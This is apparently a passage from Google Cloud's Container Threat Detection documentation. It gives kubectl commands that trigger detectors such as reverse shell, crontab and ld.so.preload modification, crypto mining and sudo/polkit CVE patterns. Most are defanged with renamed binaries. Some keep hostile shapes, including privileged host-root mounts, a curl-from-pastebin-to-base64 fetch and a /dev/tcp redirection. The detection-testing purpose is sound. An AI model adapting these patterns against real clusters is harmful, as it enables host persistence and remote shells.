This is a file monitoring detector and has [specific GKE version requirements](https://cloud.google.com/security-command-center/docs/how-to-use-container-threat-detection#gke-version).

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute a command to modify the host's `/etc/crontab` file.

     * x86 node:
           
           tag="ktd-test-cron-mod-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never --rm=true -ti --image ubuntu "$tag"\
              --overrides='{"apiVersion": "v1", "spec": {
              "containers":[{"command": ["sh", "-c", "/bin/echo >> /host/etc/crontab"],
              "name": "'$tag'", "image": "marketplace.gcr.io/google/ubuntu2404:latest",
              "securityContext": {"privileged": true},
              "volumeMounts":[{"mountPath": "/host/", "name": "host-mount",
              "readOnly": false}]}],
              "volumes": [{"name": "host-mount","hostPath": {"path": "/"}}]}}'
           

     * ARM node:
           
           tag="ktd-test-cron-mod-arm-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never --rm=true -ti --image ubuntu "$tag"\
              --overrides='{"apiVersion": "v1", "spec": {
              "containers":[{"command": ["sh", "-c", "/bin/echo >> /host/etc/crontab"],
              "name": "'$tag'", "image": "marketplace.gcr.io/google/ubuntu2404:latest",
              "securityContext": {"privileged": true},
              "volumeMounts":[{"mountPath": "/host/", "name": "host-mount",
              "readOnly": false}]}],
              "volumes": [{"name": "host-mount","hostPath": {"path": "/"}}],
              "nodeSelector": {"kubernetes.io/arch":"arm64"}, "tolerations":[{ "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" }] }}'
           

This test procedure triggers a Suspicious Cron Modification finding that you can view in Security Command Center and, if you have configured Logging for Container Threat Detection, in Cloud Logging. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center at the organization level.




## Execution: Suspicious OpenSSL Shared Object Loaded

To trigger an `Execution: Suspicious OpenSSL Shared Object Loaded` finding, execute the `openssl engine` command with an argument that is a file that ends with the `.so` extension. This example uses the latest Ubuntu 24.04 image. The `/bin/ls` utility is copied and renamed to `/tmp/openssl`. This renamed binary is then executed with the `engine` and fake `.so` file arguments. The execution of `openssl engine` with a `.so` file is flagged as suspicious because it mimics the behavior of a shared object being loaded to execute malicious code.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute `openssl engine` with a fake shared object library argument:

     * x86 node:
           
           tag="ktd-test-suspicious-openssl-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/openssl; /tmp/openssl engine /tmp/fakelib.so"
           

     * ARM node:
           
           tag="ktd-test-suspicious-openssl-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/openssl; /tmp/openssl engine /tmp/fakelib.so"
           




This test procedure creates an `Execution: Suspicious OpenSSL Shared Object Loaded` finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Exfiltration: Launch Remote File Copy Tools In Container

To trigger an `Exfiltration: Launch Remote File Copy Tools In Container` finding, execute a common remote file copy tool within a container. This example uses the latest Ubuntu 24.04 image. The `/bin/ls` utility is copied and renamed to `/tmp/rsync` and then executed to retrieve a file from a remote, potentially malicious, source. The execution of such a tool with remote file retrieval arguments within a container is flagged as suspicious, as it could indicate an attempt to download and execute malicious code or exfiltrate data.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute a remote file copy tool, like `rsync`, and execute it:

     * x86 node:
           
           tag="ktd-test-launch-remote-file-copy-tools-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/rsync; /tmp/rsync"
           

     * ARM node:
           
           tag="ktd-test-launch-remote-file-copy-tools-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/rsync; /tmp/rsync"
           




This test procedure creates an `Exfiltration: Launch Remote File Copy Tools In Container` finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Impact: Detect Malicious Cmdlines

To trigger an `Impact: Detect Malicious Cmdlines` ([Preview](https://cloud.google.com/products/#product-launch-stages)) finding, the execution of a command line with known malicious patterns or arguments must be observed within a container. This example uses the latest Ubuntu 24.04 image. It involves copying the `/bin/ls` binary and renaming that copy to `ipfs`. The renamed binary is then executed. This behavior is flagged as suspicious because it can indicate an attempt to execute malicious code or bypass security controls.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute a binary like `ipfs`:

     * x86 node:
           
           tag="ktd-test-detect-malicious-cmdlines-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/ipfs; /tmp/ipfs"
           

     * ARM node:
           
           tag="ktd-test-detect-malicious-cmdlines-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/ipfs; /tmp/ipfs"
           




This test procedure creates an `Impact: Detect Malicious Cmdlines` finding that you can view in Security Command Center and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Impact: Remove Bulk Data From Disk

To trigger an `Impact: Remove Bulk Data From Disk` finding, place a binary capable of data deletion or overwriting in your container and execute it. This example uses the latest Ubuntu 24.04 image. It involves copying the `/bin/ls` binary and renaming that copy to `shred` (or a similar utility designed for secure file deletion). The renamed binary is then executed. This action is flagged as suspicious because it mimics the behavior often seen when attempts are made to remove large amounts of data from a disk within a containerized environment.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Introduce a file or data deletion binary like `shred` and execute it:

     * x86 node:
           
           tag="ktd-test-remove-bulk-data-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/shred; /tmp/shred"
           

     * ARM node:
           
           tag="ktd-test-remove-bulk-data-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/shred; /tmp/shred"
           




This test procedure creates an `Impact: Remove Bulk Data From Disk` finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Impact: Suspicious crypto mining activity using the Stratum Protocol

To trigger an `Impact: Suspicious crypto mining activity using the Stratum Protocol` finding, a binary needs to be executed within a container with arguments that resemble those used by crypto mining software communicating using the Stratum protocol. The example uses the latest Ubuntu 24.04 image. It copies `/bin/ls` and renames that copy to a mock binary (presumably to simulate a crypto miner). This renamed binary is then executed with arguments that include `stratum+tcp` or similar Stratum protocol indicators. This activity is flagged as suspicious because it mimics the network communication patterns of crypto mining software within containerized environments.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Introduce a utility binary like `curl` and execute it with arguments that resemble those used by crypto mining software communicating using the Stratum protocol:

     * x86 node:
           
           tag="ktd-test-detect-crypto-using-stratum-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/curl; /tmp/curl --url=stratum+tcp"
           

     * ARM node:
           
           tag="ktd-test-detect-crypto-using-stratum-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/curl; /tmp/curl --url=stratum+tcp"
           




This test procedure creates an `Impact: Suspicious crypto mining activity using the Stratum Protocol` finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

You might also see an additional finding for the `bash` command that you run in this test. This behavior is normal, and you can ignore the additional finding.

## Malicious Script Executed

To trigger a Malicious Script Executed finding, you can execute the script in the following procedure in your container.

The procedure deploys the latest Ubuntu 24.04 image, copies a script that appears malicious, and then executes it. To trigger a detection, a script must appear malicious to the detector.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute the following script in a new container.

This inline Bourne shell script originated from a [honeypot](https://en.wikipedia.org/wiki/Honeypot_\(computing\)). However, it has been modified so that it does not execute the malicious binary, so running the script won't cause malicious activity in your container. The binary at the referenced URL may have been removed and attempting to follow the URL will result in a 404 error. This is expected. The _attempt_ to download, decode, and execute a binary using an inline script is what triggers the detection.

     * x86 node:
           
           tag="ktd-test-malicious-script-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true  -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- sh -c \
                 "(curl -fsSL https://pastebin.com/raw/KGwfArMR||wget -q -O - https://pastebin.com/raw/KGwfArMR)| base64 -d"
           

     * ARM node:
           
           tag="ktd-test-malicious-script-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true  -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- sh -c \
                 "(curl -fsSL https://pastebin.com/raw/KGwfArMR||wget -q -O - https://pastebin.com/raw/KGwfArMR)| base64 -d"
           




This test procedure creates a Malicious Script Executed finding that you can view in Security Command Center and in Cloud Logging if you've configured logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Malicious URL Observed

To trigger a Malicious URL Observed finding, execute a binary and provide a malicious URL as an argument.

The following example deploys an Ubuntu 24.04 image and executes `/bin/curl` to access a sample malware URL from the [Safe Browsing](https://developers.google.com/safe-browsing) service.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute `curl` and provide a malicious URL as an argument:

     * x86 node:
           
           tag="ktd-test-malicious-url-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           url="https://testsafebrowsing.appspot.com/s/malware.html"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- sh -c "cp /bin/ls /tmp/curl; /tmp/curl $url 2> /dev/null || true"
           

     * ARM node:
           
           tag="ktd-test-malicious-url-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           url="https://testsafebrowsing.appspot.com/s/malware.html"
           kubectl run \
                 --restart=Never \
                 --rm=true -i \
                 --image marketplace.gcr.io/google/ubuntu2404:latest \
                 --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
                 {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
                 "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
                 "value": "arm64" } ]}}' \
                 "$tag" -- sh -c "cp /bin/ls /tmp/curl; /tmp/curl $url 2> /dev/null || true"
           




This test procedure triggers a Malicious URL Observed finding that you can view in Security Command Center and, if you have configured Logging for Container Threat Detection, in Cloud Logging. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center at the organization level.

## Persistence: Modify ld.so.preload ([Preview](https://cloud.google.com/products/#product-launch-stages))

To trigger a `ld.so.preload` modification detection, modify the host's `/etc/ld.so.preload` file. This example deploys the latest Ubuntu 24.04 image, mounting the host's root file system into the container, and then updates `/etc/ld.so.preload`.

This is a file monitoring detector and has [specific GKE version requirements](https://cloud.google.com/security-command-center/docs/how-to-use-container-threat-detection#gke-version).

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute a binary that modifies the host's `/etc/ld.so.preload` file.

     * x86 node:
           
           tag="ktd-test-ld-preload-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never --rm=true -ti --image ubuntu "$tag"\
              --overrides='{"apiVersion": "v1", "spec": {
              "containers":[{"command": ["/bin/touch", "/host/etc/ld.so.preload"],
              "name": "'$tag'", "image": "marketplace.gcr.io/google/ubuntu2404:latest",
              "securityContext": {"privileged": true},
              "volumeMounts":[{"mountPath": "/host/", "name": "host-mount",
              "readOnly": false}]}],
              "volumes": [{"name": "host-mount","hostPath": {"path": "/"}}]}}'
           

     * ARM node:
           
           tag="ktd-test-ld-preload-arm-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never --rm=true -ti --image ubuntu "$tag"\
              --overrides='{"apiVersion": "v1", "spec": {
              "containers":[{"command": ["/bin/touch", "/host/etc/ld.so.preload"],
              "name": "'$tag'", "image": "marketplace.gcr.io/google/ubuntu2404:latest",
              "securityContext": {"privileged": true},
              "volumeMounts":[{"mountPath": "/host/", "name": "host-mount",
              "readOnly": false}]}],
              "volumes": [{"name": "host-mount","hostPath": {"path": "/"}}],
              "nodeSelector": {"kubernetes.io/arch":"arm64"}, "tolerations":[{ "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" }] }}'
           




This test procedure triggers a `ld.so.preload` modification finding that you can view in Security Command Center and, if you have configured Logging for Container Threat Detection, in Cloud Logging. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center at the organization level.

## Privilege Escalation: Abuse of Sudo For Privilege Escalation (CVE-2019-14287)

To trigger a `Privilege Escalation: Abuse of Sudo For Privilege Escalation (CVE-2019-14287)` finding, execute the `sudo` binary with the `-u#-1` parameter. This example copies the `/bin/ls` binary to imitate the `sudo` binary and executes it with the specified parameter.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Start a binary with `/bin/echo` redirection to the Google public DNS:

     * x86 node:
           
           tag="ktd-test-abuse-sudo-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
              "cp /bin/ls /tmp/sudo; /tmp/sudo -u#-1; sleep 10"
           

     * ARM node:
           
           tag="ktd-test-abuse-sudo-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
              "cp /bin/ls /tmp/sudo; /tmp/sudo -u#-1; sleep 10"
           




This test procedure creates a `Privilege Escalation: Abuse of Sudo For Privilege Escalation (CVE-2019-14287)` finding you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center at the organization level.

## Privilege Escalation: Fileless Execution in `/dev/shm`

To trigger an `Privilege Escalation: Fileless Execution in /dev/shm` finding, a process must be executed from the `/dev/shm` in-memory file system. This example uses the latest Ubuntu 24.04 image. The `/bin/echo` utility is copied to `/dev/shm/echo`. This renamed binary is then executed. The execution of a file under `/dev/shm` is flagged as suspicious because it mimics the behavior of an object trying to execute in memory to avoid file-based detections.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Create a privileged container and execute a program from an in-memory file system:

     * x86 node:
           
           tag="ktd-test-fileless-dev-shm-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"spec": {"containers": [{"name": "'$tag'", "image": "marketplace.gcr.io/google/ubuntu2404:latest", "securityContext": {"privileged": true}, "command": ["bash", "-c", "cp /bin/echo /dev/shm/echo; chmod +x /dev/shm/echo; mount -o remount,exec /dev/shm; /dev/shm/echo \"Hello from /dev/shm\""]}]}}' \
              "$tag"
           

     * ARM node:
           
           tag="ktd-test-fileless-dev-shm-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": {
              "containers": [{"name": "'$tag'", "image": "marketplace.gcr.io/google/ubuntu2404:latest", "securityContext": {"privileged": true}, "command": ["bash", "-c", "cp /bin/echo /dev/shm/echo; chmod +x /dev/shm/echo; mount -o remount,exec /dev/shm; /dev/shm/echo \"Hello from /dev/shm\""]}],
              "nodeSelector": {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag"
           




This test procedure creates an `Privilege Escalation: Fileless Execution in /dev/shm` finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Privilege Escalation: Polkit Local Privilege Escalation Vulnerability (CVE-2021-4034)

To trigger a `Privilege Escalation: Polkit Local Privilege Escalation Vulnerability (CVE-2021-4034)` finding, execute a `pkexec` binary with the `GCONV_PATH` environment variable set as a non-root user. This example copies the `/bin/ls` binary to imitate the `pkexec` binary and executes it with the specified parameter as user ID 1000.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Start a binary with `/bin/echo` redirection to the Google public DNS:

     * x86 node:
           
           tag="ktd-test-polkit-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": {
              "securityContext": { "runAsUser": 1000 }}}' \
              "$tag" -- bash -c \
              "cp /bin/ls /tmp/pkexec; GCONV_PATH=junk /tmp/pkexec; sleep 10"
           

     * ARM node:
           
           tag="ktd-test-polkit-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": {
              "securityContext": { "runAsUser": 1000 }, "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
              "cp /bin/ls /tmp/pkexec; GCONV_PATH=junk /tmp/pkexec; sleep 10"
           




This test procedure creates a `Privilege Escalation: Polkit Local Privilege Escalation Vulnerability (CVE-2021-4034)` finding you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center at the organization level.

## Privilege Escalation: Sudo Potential Privilege Escalation (CVE-2021-3156)

To trigger a `Privilege Escalation: Sudo Potential Privilege Escalation (CVE-2021-3156)` finding, execute the `sudo` binary as a non-root user with the `-s` parameter and a parameter that ends with `\`. This example copies the`/bin/ls`binary to imitate the`sudo` binary and executes it with the specified parameters.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Start a binary with `/bin/echo` redirection to the Google public DNS:

     * x86 node:
           
           tag="ktd-test-sudo-potential-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": {
              "securityContext": { "runAsUser": 1000 }}}' \
              "$tag" -- bash -c \
              'cp /bin/ls /tmp/sudo; /tmp/sudo -s "123\\"; sleep 10'
           

     * ARM node:
           
           tag="ktd-test-sudo-potential-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": {
              "securityContext": { "runAsUser": 1000 },
              "nodeSelector": { "kubernetes.io/arch":"arm64" }, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
              'cp /bin/ls /tmp/sudo; /tmp/sudo -s "123\\"; sleep 10'
           




This test procedure creates a `Privilege Escalation: Sudo Potential Privilege Escalation (CVE-2021-3156)` finding you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center at the organization level.

## Reverse Shell

To trigger a Reverse Shell finding, start a binary with `stdin` redirection to a TCP connected socket. This example copies `/bin/echo` to `/tmp/sh`, then starts `/tmp/sh` with redirection to the [Google public DNS](https://en.wikipedia.org/wiki/Google_Public_DNS) `8.8.8.8` on the DNS port. Nothing is printed when you run this example. To prevent any external code injection through a [man-in-the-middle (MITM) attack](https://en.wikipedia.org/wiki/Man-in-the-middle_attack), this example doesn't use the `/bin/sh` binary.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Start a binary with `/bin/echo` redirection to the Google public DNS:

     * x86 node:
           
           tag="ktd-test-reverse-shell-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "cp /bin/echo /tmp/sh; /tmp/sh >& /dev/tcp/8.8.8.8/53 0>&1"
           

     * ARM node:
           
           tag="ktd-test-reverse-shell-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "cp /bin/echo /tmp/sh; /tmp/sh >& /dev/tcp/8.8.8.8/53 0>&1"
           




This test procedure creates a Reverse Shell finding you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center at the organization level.

## Unexpected Child Shell

To test the `Unexpected Child Shell` detector, you can create a process tree that includes a child shell process.

The following example creates an `consul->dash` process tree, which can be detected by the `Unexpected Child Shell` detector. This test is safe because it uses only built-in binaries. This example does the following:

  1. Creates a copy of the `sh` process and names it `consul`.
  2. Copies the `echo` process and names it `dash`.
  3. Invokes the copied `dash` process in the copied `consul` process.



To trigger an `Unexpected Child Shell` finding, do the following:

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Use the mock `consul` process to invoke a mock shell:

     * x86 node:
           
           tag="ktd-test-unexpected-child-shell-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -ti \
              --image ubuntu "$tag" \
              --command -- /bin/sh -c \
                 'cp /bin/sh /tmp/consul; cp /bin/echo /tmp/sh; \
                 /tmp/consul -c "/tmp/sh child ran successfully & wait"'
           

     * ARM node:
           
           tag="ktd-test-unexpected-child-shell-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -ti \
              --image ubuntu \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" --command -- /bin/sh -c \
                 'cp /bin/sh /tmp/consul; cp /bin/echo /tmp/sh; \
                 /tmp/consul -c "/tmp/sh child ran successfully & wait"'
           




This test procedure creates an `Unexpected Child Shell` finding that you can view in Security Command Center. If Logging is configured for Container Threat Detection and you have Security Command Center Premium or Enterprise activated at the organization level, then you can view the finding in Cloud Logging too.

For noise reduction, when you first create a container, Container Threat Detection temporarily filters out Unexpected Child Shell. To see all Unexpected Child Shell findings while setting up a container, prefix your container name or Pod name with `ktd-test`, as in the example.

## What's next

  * Learn how to [use Container Threat Detection](https://docs.cloud.google.com/security-command-center/docs/how-to-use-container-threat-detection).



Send feedback 

Except as otherwise noted, the content of this page is licensed under the [Creative Commons Attribution 4.0 License](https://creativecommons.org/licenses/by/4.0/), and code samples are licensed under the [Apache 2.0 License](https://www.apache.org/licenses/LICENSE-2.0). For details, see the [Google Developers Site Policies](https://developers.google.com/site-policies). Java is a registered trademark of Oracle and/or its affiliates.

Last updated 2026-10-22 UTC.

Need to tell us more?  [[["Easy to understand","easyToUnderstand","thumb-up"],["Solved my problem","solvedMyProblem","thumb-up"],["Other","otherUp","thumb-up"]],[["Hard to understand","hardToUnderstand","thumb-down"],["Incorrect information or sample code","incorrectInformationOrSampleCode","thumb-down"],["Missing the information/samples I need","missingTheInformationSamplesINeed","thumb-down"],["Other","otherDown","thumb-down"]],["Last updated 2026-10-22 UTC."],[],[]] 
